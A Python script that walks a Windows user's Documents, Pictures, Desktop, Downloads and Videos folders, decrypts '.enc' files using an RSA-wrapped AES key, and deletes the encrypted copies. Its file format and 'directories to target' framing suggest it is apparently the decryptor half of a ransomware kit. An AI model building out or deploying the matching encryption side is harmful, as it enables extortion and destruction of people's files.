from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
import os


def decrypt_file(file_path, private_key):
    # Read the encrypted file
    with open(file_path, 'rb') as encrypted_file:
        iv = encrypted_file.read(16)
        encrypted_aes_key = encrypted_file.read(256)
        encrypted_data = encrypted_file.read()

    # Decrypt the AES key
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Decrypt the data with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv),
                    backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded_data = decryptor.update(
        encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = sym_padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(
        decrypted_padded_data) + unpadder.finalize()

    # Save the decrypted data
    original_path = file_path.rsplit('.enc', 1)[0]
    with open(original_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

     # Remove the encrypted file safely after decryption
    try:
        os.remove(file_path)
        print(f"Encrypted file {file_path} removed after decryption.")
    except OSError as e:
        print(f"Error: {file_path} : {e.strerror}")


def decrypt_directory(directory_path, private_key_pem_path):
    # Load private key
    with open(private_key_pem_path, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(), password=None, backend=default_backend())

    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, private_key)
                print(f"Decrypted {file_path}")


def main():
    # Example usage
    # Directories to target
    user_dirs = [
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
        os.path.join(os.environ['USERPROFILE'], 'Videos')
    ]

    for directory in user_dirs:
        if os.path.exists(directory):
            decrypt_directory(directory, "keys/private_key.pem")
        else:
            print(f"Directory does not exist: {directory}")
